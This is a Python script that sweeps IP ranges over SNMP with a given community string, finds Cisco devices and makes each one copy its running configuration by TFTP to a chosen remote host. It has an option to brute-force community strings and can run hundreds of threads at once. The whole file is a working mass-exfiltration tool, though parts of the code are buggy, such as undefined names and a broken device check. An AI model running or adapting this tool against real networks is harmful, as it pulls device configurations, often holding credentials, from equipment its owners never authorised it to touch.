# example usage
# python snmp_test.py -c accnet_mgmt -t 10.21.1.110 -f 

# SET Command Generator 
import asyncore, socket, sys
from pysnmp.carrier.asynsock.dispatch import AsynsockDispatcher
from pysnmp.carrier.asynsock.dgram import udp
from pyasn1.codec.ber import encoder, decoder
from optparse import OptionParser
from pysnmp.proto import api
from time import time,sleep
import threading, asyncore
# Protocol version to use

IO_LOCK = threading.Lock()



MAX_CLIENTS = 200
CLIENTS_MAP = {}
ACTIVE_CLIENTS = []
CLEANUP_THREAD = None
CLEANUP_FREQ = 3

COMMON_OID = [1,3,6,1,4,1,9,9,96,1,1,1,1,"REPLACE",52987]
BASE_OID = [1,3,6,1,4,1,9,9,96,1,1,1,1,]
SNMPModule = api.protoModules[api.protoVersion1]

OUTFNAME = "simple_snmp_thingy.txt"
OWRITE_LOCK = threading.Lock()
OUTFILE = open(OUTFNAME, 'a')

def cleanup(cleanup_time):
	global ACTIVE_CLIENTS, CLEANUP_THREAD
	new_clients = []
	for i in ACTIVE_CLIENTS:
		if i.isComplete():
			continue
		new_clients.append(i)
	ACTIVE_CLIENTS = new_clients
	CLEANUP_THREAD = thread.Timer(cleanup_time, cleanup, (cleanup_time,))




def Build_GetSystemPDUType(comm_string):
	# Build PDU
	reqPDU =  SNMPModule.GetRequestPDU()
	SNMPModule.apiPDU.setDefaults(reqPDU)
	SNMPModule.apiPDU.setVarBinds(
		reqPDU, (((1,3,6,1,2,1,1,1,0), SNMPModule.Null()),)
		)

	# Build message
	reqMsg = SNMPModule.Message()
	SNMPModule.apiMessage.setDefaults(reqMsg)
	SNMPModule.apiMessage.setCommunity(reqMsg, comm_string)
	SNMPModule.apiMessage.setPDU(reqMsg, reqPDU)
	return reqMsg

	

def Build_GetSystemPDUName(comm_string):
	# Build PDU
	reqPDU =  SNMPModule.GetRequestPDU()
	SNMPModule.apiPDU.setDefaults(reqPDU)
	SNMPModule.apiPDU.setVarBinds(
		reqPDU, (((1,3,6,1,2,1,1,5,0), SNMPModule.Null()),)
		)

	# Build message
	reqMsg = SNMPModule.Message()
	SNMPModule.apiMessage.setDefaults(reqMsg)
	SNMPModule.apiMessage.setCommunity(reqMsg, comm_string)
	SNMPModule.apiMessage.setPDU(reqMsg, reqPDU)
	return reqMsg
	
def Build_SetPDU(oid, oid_val, comm_string):
	# Build PDU
	reqPDU =  SNMPModule.SetRequestPDU()
	SNMPModule.apiPDU.setDefaults(reqPDU)
	SNMPModule.apiPDU.setVarBinds(
		reqPDU, ((oid, oid_val),)
		)
	# Build message
	reqMsg = SNMPModule.Message()
	SNMPModule.apiMessage.setDefaults(reqMsg)
	SNMPModule.apiMessage.setCommunity(reqMsg, comm_string)
	SNMPModule.apiMessage.setPDU(reqMsg, reqPDU)
	return reqMsg

def BuildSend_CopyMsg(addr, comm_string, dst_ipaddr, snmp_sock):
	global startedAt
	copy_oid, copy_val = BASE_OID + [2,52987], SNMPModule.Integer(1)
	cpyMsg = Build_SetPDU(copy_oid, copy_val, comm_string)
	startedAt = time()
	snmp_sock.sendto(encoder.encode(copyMsg), (addr, 161))
	#Send_CopyPDU(cpyMsg, addr)
	

def BuildSend_SrcFileMsg(addr, sys_name, comm_string, dst_ipaddr, snmp_sock):
	global startedAt
	srcFileType_oid, srcFT_val = BASE_OID + [3,52987], SNMPModule.Integer(4)	
	sftMsg = Build_SetPDU(srcFileType_oid, srcFT_val, comm_string)
	startedAt=time()
	#Send_CopyPDU(sftMsg, addr)
	snmp_sock.sendto(encoder.encode(sftMsg), (addr, 161))

def BuildSend_DstFileMsg(addr, sys_name, comm_string, dst_ipaddr, snmp_sock):
	global startedAt
	dstFileType_oid, dstFT_val = BASE_OID + [4,52987], SNMPModule.Integer(1)
	dftMsg = Build_SetPDU(dstFileType_oid, dstFT_val, comm_string)
	startedAt=time()
	#Send_CopyPDU(dftMsg, addr)
	snmp_sock.sendto(encoder.encode(dftMsg), (addr, 161))

def BuildSend_DstFileNameMsg(addr, sys_name, comm_string, dst_ipaddr, snmp_sock):
	global startedAt
	dstFname_oid, dstFname_val = BASE_OID + [6,52987], SNMPModule.OctetString(sys_name+".CiscoConfig")
	dstFnameMsg = Build_SetPDU(dstFname_oid, dstFname_val, comm_string)
	startedAt=time()
	#Send_CopyPDU(dstFnameMsg, addr)
	snmp_sock.sendto(encoder.encode(dstFnameMsg), (addr, 161))
	
def BuildSend_DstAddrMsg(addr, sys_name, comm_string, dst_ipaddr, snmp_sock):
	global startedAt
	dstAddr_oid, dstAddr_val = BASE_OID + [5,52987], SNMPModule.IpAddress(dst_ipaddr)
	addrMsg = Build_SetPDU(dstAddr_oid, dstAddr_val, comm_string)
	startedAt=time()
	#Send_CopyPDU(addrMsg, addr)
	snmp_sock.sendto(encoder.encode(addrMsg), (addr, 161))
	
def BuildSend_DoneMsg(addr, sys_name, comm_string, dst_ipaddr, snmp_sock):
	global startedAt
	done_oid, done_val = BASE_OID + [14,52987], SNMPModule.Integer(1)
	doneMsg = Build_SetPDU(done_oid, done_val, comm_string)
	startedAt=time()
	#Send_CopyPDU(doneMsg, addr)
	snmp_sock.sendto(encoder.encode(doneMsg), (addr, 161))

	
class snmp_client:

	def __init__(self, host, remote_host, comm_string="public", timeout=0.3):
		self.timeout = timeout
		self.socket= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.socket.settimeout(self.timeout)
		self._comm_string = comm_string
		self._addr = (host,161)
		self._sysname = None
		self._isCisco = None
		self._complete = False
		self._rhost = remote_host
		self.sendGetSystemType()
		
	
	def isComplete(self):
		return self._complete

	def handle_connect(self):
		self.handle_read()

	def handle_close(self):
		self.close()
	
	def readSystemType(self, wholeMsg):
		rspMsg, wholeMsg = decoder.decode(wholeMsg, asn1Spec=SNMPModule.Message())
		rspPDU = SNMPModule.apiMessage.getPDU(rspMsg)
		errorStatus = SNMPModule.apiPDU.getErrorStatus(rspPDU)
		if errorStatus:
			IO_LOCK.acquire()
			print errorStatus.prettyPrint()
			IO_LOCK.release()
			self._complete = True
		else:
			oid, val = SNMPModule.apiPDU.getVarBinds(rspPDU)[0]
			self._isCisco = val.prettyPrint() > -1
			if self._isCisco:
				"Host %s is Cisco"%(self._addr[0])
			

	def readSystemName(self, wholeMsg):
		rspMsg, wholeMsg = decoder.decode(wholeMsg, asn1Spec=SNMPModule.Message())
		rspPDU = SNMPModule.apiMessage.getPDU(rspMsg)
		errorStatus = SNMPModule.apiPDU.getErrorStatus(rspPDU)
		if errorStatus:
			IO_LOCK.acquire()
			print errorStatus.prettyPrint()
			IO_LOCK.release()
			self._complete = True
		else:
			oid, val = SNMPModule.apiPDU.getVarBinds(rspPDU)[0]
			self._sysname = val.prettyPrint()
			IO_LOCK.acquire()
			print "Found: %s"%self._addr[0]
			IO_LOCK.release()
			#OWRITE_LOCK.acquire()
			#OUTFILE.write("%s\n"%self._rhost)
			#OWRITE_LOCK.release()
			self.sendGetConfig()

			
	def handle_read(self):
		global OUTFILE, OWRITE_LOCK, THREADS_LOCK, THREADS_LOCK
		#print "Handling a read call"
		try:
			whole_msg, addr_info = self.socket.recvfrom(4096)
		except IOError:
			THREADS_LOCK.acquire()
			try:
				if self._addr[0] in THREAD_MAP:
					del THREAD_MAP[ipaddr]
			except KeyError:
				pass
			except:
				print sys.exc_info()
			THREADS_LOCK.release()
			#print "Failed to recv data from %s"%(str(self._addr))
			self._complete = True
			return
		if self._isCisco is None:
			IO_LOCK.acquire()
			print "Checking if the system is a Cisco"
			IO_LOCK.release()
			self.readSystemType(whole_msg)
			if self._isCisco:
				self.sendGetSystemName()
			return
		if self._isCisco and self._sysname is None:
			self.readSystemName(whole_msg)
			return
		self._complete = True

	
	def sendGetSystemType(self):
		reqMsg = Build_GetSystemPDUType(self._comm_string)
		self.socket.sendto( encoder.encode(reqMsg), self._addr)
		self.handle_read()
		
	def sendGetSystemName(self):
		reqMsg = Build_GetSystemPDUName(self._comm_string)
		self.socket.sendto( encoder.encode(reqMsg), self._addr)
		self.handle_read()
			
	def sendGetConfig(self):
		self.sendCopyInit()
		self.sendSrcFileMsg()
		self.sendDstFileMsg()
		self.sendDstAddrMsg()
		self.sendDstFileNameMsg()
		self.sendDoneMsg()
		sleep(1)
		self._complete = True

	def writable(self):
		pass

	def handle_write(self):
		pass
		
	def sendCopyInit(self):
		copy_oid, copy_val = BASE_OID + [2,52987], SNMPModule.Integer(1)
		cpyMsg = Build_SetPDU(copy_oid, copy_val, self._comm_string)
		self.socket.sendto(encoder.encode(cpyMsg), self._addr)

	def sendSrcFileMsg(self):
		srcFileType_oid, srcFT_val = BASE_OID + [3,52987], SNMPModule.Integer(4)	
		sftMsg = Build_SetPDU(srcFileType_oid, srcFT_val, self._comm_string)
		self.socket.sendto(encoder.encode(sftMsg), self._addr)

	def sendDstFileMsg(self):
		dstFileType_oid, dstFT_val = BASE_OID + [4,52987], SNMPModule.Integer(1)
		dftMsg = Build_SetPDU(dstFileType_oid, dstFT_val, self._comm_string)
		self.socket.sendto(encoder.encode(dftMsg), self._addr)

	def sendDstFileNameMsg(self):
		dstFname_oid, dstFname_val = BASE_OID + [6,52987], SNMPModule.OctetString(self._sysname+".CiscoConfig")
		dstFnameMsg = Build_SetPDU(dstFname_oid, dstFname_val, self._comm_string)
		self.socket.sendto(encoder.encode(dstFnameMsg), self._addr)
		
	def sendDstAddrMsg(self):
		dstAddr_oid, dstAddr_val = BASE_OID + [5,52987], SNMPModule.IpAddress(self._rhost)
		addrMsg = Build_SetPDU(dstAddr_oid, dstAddr_val, self._comm_string)
		self.socket.sendto(encoder.encode(addrMsg), self._addr)
		
	def sendDoneMsg(self):
		done_oid, done_val = BASE_OID + [14,52987], SNMPModule.Integer(1)
		doneMsg = Build_SetPDU(done_oid, done_val, self._comm_string)
		self.socket.sendto(encoder.encode(doneMsg), self._addr)
	


def set_parse_options():
	parser = OptionParser()
	parser.add_option("-t", "--tftp", dest="rhost", type="string",
                  help="remote tftp servers address")
	parser.add_option("-c", "--community_string", dest="comm_string", type="string",
                  help="single SNMP community string")
	parser.add_option("-f", "--infile", dest="fname", type="string",
                  help="file name holding the ipaddresses")
	parser.add_option("-i", "--ipaddr", dest="ipaddr", type="string",
                  help="single ip address to try")
	parser.add_option("-m", "--maxthreads", dest="max", type="int",
                  help="single ip address to try")
	parser.add_option("-s", "--strings", dest="comm_strings", type="string",
                  help="file name SNMP strings to brute force")
	parser.set_defaults(ipaddr = None, 
			rhost = None,
			comm_string = None,
			fname=None,
			comm_strings=None,
			max=500)
	return parser

	
def Send_CopyPDU(reqMsg, hostname, port=161):
	transportDispatcher = AsynsockDispatcher()
	transportDispatcher.registerTransport(
		udp.domainName, udp.UdpSocketTransport().openClientMode()
		)
	transportDispatcher.registerRecvCbFun(cbRecvFun2)
	transportDispatcher.registerTimerCbFun(cbTimerFun)
	transportDispatcher.sendMessage(
		encoder.encode(reqMsg), udp.domainName, (hostname, 161)
		)
	transportDispatcher.jobStarted(1)
	transportDispatcher.runDispatcher()
	transportDispatcher.closeDispatcher()

def Send_GetSystemPDUName(reqMsg, hostname, port=161):
	transportDispatcher = AsynsockDispatcher()
	transportDispatcher.registerTransport(
		udp.domainName, udp.UdpSocketTransport().openClientMode()
		)
	transportDispatcher.registerRecvCbFun(cbRecvFun)
	transportDispatcher.registerTimerCbFun(cbTimerFun)
	transportDispatcher.sendMessage(
		encoder.encode(reqMsg), udp.domainName, (hostname, 161)
		)
	transportDispatcher.jobStarted(1)
	transportDispatcher.runDispatcher()
	transportDispatcher.closeDispatcher()

	

def build_mask(bits=24):
	# we already have the 1 bit in there
	mask = 1
	for i in xrange(0,32-bits-1):
		mask = (mask << 1)
		mask = (mask +1)
	#for i in xrange(0,32 - bits):
	#	mask = mask << 1
	return mask
	

def str_to_int(s):
	i = ord(s[0]) << 24
	i += ord(s[1]) << 16
	i += ord(s[2]) << 8
	i += ord(s[3])
	return i


def int_to_str(i):
	s = [0,0,0,0] 
	s[0]= chr((i&0xFF000000) >> 24)
	s[1]= chr((i&0x00FF0000) >> 16)
	s[2]= chr((i&0x0000FF00) >> 8 )
	s[3]= chr((i&0x000000FF)      )
	return "".join(s)
	

def expand_addresses_to_file(cidr, fname):
	add_ip_set = lambda lset,ip: lset.add(socket.inet_ntoa(int_to_str(ip)))
	# this check to make sure all the values are digits and not other
	# stuff.
	f = open(fname,"a")
	
	ip_addrs = set()
	if cidr.find("/") == -1:
		return ip_addrs    
	bits = int(cidr.split("/")[1].strip())
	addr = cidr.split("/")[0].strip()
	mask = build_mask(bits)
	#print hex(bits), hex(mask)
	start = current = str_to_int(socket.inet_aton(addr))
	current += 1
	bool = False
	while current & mask != start & mask:
		f.write(socket.inet_ntoa(int_to_str(current))+"\n")
		#print hex(current & mask) , hex(start & mask), hex(current), hex(mask)
		current += 1
		bool = True

def expand_addresses(cidr):
	add_ip_set = lambda lset,ip: lset.add(socket.inet_ntoa(int_to_str(ip)))
	# this check to make sure all the values are digits and not other
	# stuff.
	
	ip_addrs = set()
	if cidr.find("/") == -1 and cidr.find(".") > -1:
		ip_addrs.add(cidr)
		return ip_addrs
	elif cidr.find("/") == -1:
		return ip_addrs
	
	bits = int(cidr.split("/")[1].strip())
	addr = cidr.split("/")[0].strip()
	mask = build_mask(bits)
	#print hex(bits), hex(mask)
	start = current = str_to_int(socket.inet_aton(addr))
	add_ip_set(ip_addrs, current)
	current += 1
	while current & mask != start & mask:
		add_ip_set(ip_addrs, current)
		current += 1
		#print hex(current & mask) , hex(start & mask), hex(current), hex(mask)
	return ip_addrs

def expand_addrs_from_file(fname):
	ipaddrs=set()
	data = open(fname).readlines()
	for i in data:
		if i.strip() == "":
			continue
		ipaddrs |= expand_addresses(i.strip())
	ips = [i for i in ipaddrs]
	ips.sort()
	return ips
COMPLETED_READING = False
IP_ADDRS = []
IP_LOCK = threading.Lock()
IP_READER_THREAD = None
def expand_ips_thread(fname):
	global IP_LOCK, IP_ADDRS, COMPLETED_READING
	try:
		cidr_addrs = open(fname).readlines()
		for i in cidr_addrs:
			
			if i.strip() == "":
				continue
			ips = expand_addresses(i.strip())
			IP_LOCK.acquire()
			for i in ips:
				IP_ADDRS.append(i)
			IP_LOCK.release()
			if COMPLETED_READING:
				break
	except:
		IO_LOCK.acquire()
		print "Exception in the IP Reading thread"
		IO_LOCK.release()
	COMPLETED_READING = True

CLIENTS = []
STOP_CLEANUP = False
CLEANUP_THREAD = None
THREADS = []
THREADS_LOCK = threading.Lock()
THREAD_MAP = {}

def thread_maintanence(timer_val):
	global THREADS, THREADS_LOCK, CLEANUP_THREAD, STOP_CLEANUP, THREAD_MAP
	if STOP_CLEANUP:
		return
	new_threads = {}
	THREADS_LOCK.acquire()
	for client in THREAD_MAP:
		if THREAD_MAP[client].isAlive():
			new_threads[client]= THREAD_MAP[client]
	THREAD_MAP = new_threads
	THREADS_LOCK.release()
	CLEANUP_THREAD = threading.Timer(timer_val, thread_maintanence, args=(timer_val,))
	CLEANUP_THREAD.start()

def run_client(ip, tftp_host, comm_string):
	c = snmp_client(ip,tftp_host,comm_string)

if __name__ == "__main__":
	parser = set_parse_options()
	(options, args) = parser.parse_args()
	cleanup_time = 3
	ipaddrs = []
	commstrs = []
	if options.ipaddr is None and\
		options.fname is None:
		print "Error did not specify an IP Address or filename"
		parser.print_help()
		sys.exit(-1)
	elif  options.ipaddr:
		IP_ADDRS.append(options.ipaddr)
		COMPLETED_READING = True
	else:
		IP_READER_THREAD = threading.Thread(target=expand_ips_thread, args=(options.fname,))
		IP_READER_THREAD.start()
		#IPADDRS = expand_addrs_from_file(options.fname)
		#print ipaddrs
	
	if options.comm_string is None and\
		options.comm_strings is None:
		print "Error did not specify an community string or filename of strings"
		parser.print_help()
		sys.exit(-1)
	elif options.comm_string:
		commstrs.append(options.comm_string)
	else:
		commstrs = [i.strip() for i in open(options.comm_strings).readlines()]
	rhost = options.rhost
	if rhost is None:
		print "Error did not specify an community string or filename of strings"
		parser.print_help()
		sys.exit(-1)
		
	timer_val = .9
	CLEANUP_THREAD = threading.Timer(timer_val, thread_maintanence, args=(timer_val,))
	CLEANUP_THREAD.start()
	continue_processing = len(IP_ADDRS) > 0 or not COMPLETED_READING
	while len(IP_ADDRS) > 0 or not COMPLETED_READING:
		try:
			comm_string = commstrs[0]
			if not len(IP_ADDRS) > 0:
				sleep(1)
				continue
			while len(THREAD_MAP) > options.max:
				sleep(1.0)
			IP_LOCK.acquire()
			ipaddr = IP_ADDRS.pop()
			IP_LOCK.release()
			IO_LOCK.acquire()
			print "IP: %s LenThreadMap: %d LenIPAddrs: %d COMPLETED_READING: %s"%(ipaddr, len(THREAD_MAP), len(IP_ADDRS), str(COMPLETED_READING))
			IO_LOCK.release()
			t = threading.Thread(target=run_client, args=(ipaddr, rhost, comm_string))
			t.start()
			THREADS_LOCK.acquire()
			THREAD_MAP[ipaddr] = t
			THREADS_LOCK.release()
			if not CLEANUP_THREAD.isAlive():
				CLEANUP_THREAD = threading.Timer(timer_val, thread_maintanence, args=(timer_val,))
				CLEANUP_THREAD.start()
		except KeyboardInterrupt:
			print "Keyboard Interrupt: Quitting"
			break
		except:
			print "Exception in main thread", sys.exc_info()
			break
	print "Waiting..."
	while len(THREAD_MAP) > 0:
		sleep(1)
	STOP_CLEANUP = True
	CLEANUP_THREAD.cancel()
	print "All done"
	print "Finished sending all the necessary"
	
	
	